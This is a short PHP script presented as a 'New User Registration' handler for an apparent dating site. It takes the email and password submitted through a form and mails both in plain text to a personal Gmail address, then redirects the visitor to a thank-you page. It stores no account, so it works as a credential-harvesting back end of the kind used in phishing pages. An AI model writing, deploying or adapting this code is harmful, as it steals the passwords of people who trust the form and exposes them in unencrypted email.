<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    // Define the recipient's email address
    $recipient = 'aacematt@gmail.com';
    
    // Define the email subject
    $subject = 'New User Registration';
    
    // Compose the email message
    $message = "Email: $email\nPassword: $password";
    
    // Additional headers
    $headers = 'From: webmaster@lovebliss.com' . "\r\n" .
        'Reply-To: webmaster@lovebliss.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();
    
    // Send the email
    if (mail($recipient, $subject, $message, $headers)) {
        // Email sent successfully
        header('Location: thank_you.html');
    } else {
        // Email sending failed
        header('Location: error.html');
    }
}
?>
